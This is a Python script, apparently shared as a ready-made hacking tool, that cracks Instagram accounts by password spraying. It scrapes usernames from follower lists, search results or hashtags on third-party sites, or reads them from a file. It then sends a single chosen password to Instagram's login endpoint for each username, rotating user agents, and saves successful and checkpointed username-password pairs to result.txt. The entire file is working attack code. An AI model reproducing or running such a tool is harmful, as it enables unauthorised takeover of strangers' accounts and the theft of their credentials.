import requests, random, os, time
from bs4 import BeautifulSoup as parser

jancok = ("""
\033[1;97m┏━━ ┏━━┓ ┏━━┓ ┏━━ ┓ ┏   ┳ ┏━━┓
┃   ┣━┳┛ ┣━━┫ ┃   ┣┳┛ - ┃ ┃ ━┓
┗━━ ┻ ┗━ ┻  ┻ ┗━━ ┛┗━   ┻ ┗━━┛
\x1b[41;1;33m DOSA TANGGUNG SENDIRI YA BRO \x1b[0;0m
""")

os.system("clear")
while True:
	useragent = random.choice(open("ua.txt","r").read().splitlines())
	break
link = "https://gramho.com"
stop = False

def save(user, file, type):
	sepas = open(file, type)
	sepas.write(user+"\n")
	sepas.close()

def crack(username, password):
	url = "https://www.instagram.com/"
	sesi = requests.Session()
	header = {
		'Accept-Encoding': 'gzip, deflate',
		'Accept-Language': 'en-US,en;q=0.8',
		'Connection': 'keep-alive',
		'Content-Length': '0',
		'Host': 'www.instagram.com',
		'Referer': 'https://www.instagram.com/',
		'User-Agent': useragent,
		'X-Instagram-AJAX': '1',
		'X-Requested-With': 'XMLHttpRequest'
	}
	sesi.headers.update(header)
	sesi.cookies.update({
		'sessionid': '', 'mid': '', 'ig_pr': '1',
		'ig_vw': '1920', 'csrftoken': '',
		's_network': '', 'ds_user_id': ''
	})
	sesi.get('https://www.instagram.com/web/__mid')
	sesi.headers.update({'X-CSRFToken': sesi.cookies.get_dict()['csrftoken']})
	enc_pass = '#PWD_INSTAGRAM_BROWSER:0:{}:{}'.format(int(time.time()), password)
	data_post = {
		"username": username,
		"enc_password": enc_pass
	}
	try:
		req = sesi.post("https://www.instagram.com/accounts/login/ajax/", data=data_post, allow_redirects=True).json()
		if req["authenticated"] == True:
			print(f"\033[1;97m[\033[1;32mSUCCESS\033[1;97m] {username} => {password}")
			save("Username : "+username+"\nPassword : "+password+"\nStatus : Success\n", "result.txt", "a")
		else:
			print(f"\033[1;97m[\033[1;91mFAILED\033[1;97m] {username} => {password}")
	except KeyError:
		if "Please wait" in req["message"]:
			print("Limit, Please wait a few minutes")
		else:
			print(f"\033[1;97m[\033[1;93mCEKPOINT\033[1;97m] {username} => {password}")
			save("Username : "+username+"\nPassword : "+password+"\nStatus : Cekpoint\n", "result.txt", "a")



def MainTools():
	print("\n\nSubcribe My Channel")
	time.sleep(4.0)
	os.system('xdg-open https://youtube.com/channel/UCfoEcEdGBtYdFoMP8xAXYoQ') 
	os.system('clear')
	print(jancok)
	print("\033[1;97m[\033[1;32m1\033[1;97m] Crack By Followers")
	print("\033[1;97m[\033[1;32m2\033[1;97m] Crack By Query")
	print("\033[1;97m[\033[1;32m3\033[1;97m] Crack By Hastag")
	print("\033[1;97m[\033[1;32m4\033[1;97m] Crack With File")
	menu = input("\n➛ ")
	if menu == "1":
		foll = input("(example : jokowi)\n\033[1;97m[\033[1;32m•\033[1;97m] Input Name   : ")
		pw = input("\033[1;97m[\033[1;32m•\033[1;97m] Set password : ")
		print("\n\033[1;97m[\033[1;32m•\033[1;97m] Result will be saved in (result.txt)\n")
		Session().getByFollowers(foll, pw)
	elif menu == "2":
		foll = input("(example : sarah)\nInput Name : ")
		pw = input("Set password : ")
		print("\n\033[1;97m[\033[1;32m•\033[1;97m] Result will be saved in (result.txt)\n")
		Session().getByQuery(foll, pw)
	elif menu == "3":
		tag = input("(without '#')\nInput tag : ")
		pw = input("Set password : ")
		print("\n\033[1;97m[\033[1;32m•\033[1;97m] Result will be saved in (result.txt)\n")
		Session().getByHashtag(tag, pw)
	elif menu == "4":
		file = open(input("File Username : ")).read().splitlines()
		pw = input("Set Password : ")
		print("\n\033[1;97m[\033[1;32m•\033[1;97m] Result will be saved in (result.txt)\n")
		for asuu in file:
			crack(asuu, pw)

class Session:

	# GET USER FROM FOLLOWERS
	def getByFollowers(self, user, password):
		url = link+"/followers/"+user
		while True:
			ua = random.choice(open("ua.txt","r").read().splitlines())
			getData = requests.get(url, headers={"user-agent": ua}).text
#			print(getData)
			htmlBeauti = parser(getData, "html.parser")
			for username in htmlBeauti.find_all("span", class_="followers_username"):
				users = username.text.replace("@","")
				crack(users, password)
			if "load-more-wrapper" in str(htmlBeauti):
				next = htmlBeauti.find("div", class_="load-more-wrapper")["data-next"]
				url = link+next
			elif "pagination-next-page-input" in str(htmlBeauti):
				next = htmlBeauti.find("input", class_="pagination-next-page-input")["value"]
				url = link+next
			else: break


	def getByQuery(self, search, password):
		url = link+"/search/"+search
		getData = requests.get(url, headers={"user-agent": useragent}).text
		htmlBeauti = parser(getData, "html.parser")
		for username in htmlBeauti.find_all("div", class_="result-username"):
			userid = username.text.replace("@","")
			crack(userid, password)

	def getByHashtag(self, tag, password):
		url = "https://www.insusers.com/hashtag/"+tag
		while True:
			ua = random.choice(open("ua.txt","r").read().splitlines())
			respon = requests.get(url, headers={"user-agent": useragent}).text
			html = parser(respon, "html.parser")
			for data in html.find_all("a", class_="text-default"):
				user = data["href"].replace("/","")
				crack(user, password)
			if "Next page" in str(html):
				next = html.find("a", title="Next page")
				url = f"https://www.insusers.com/hashtag/{tag}/{next}"
			else: break
MainTools()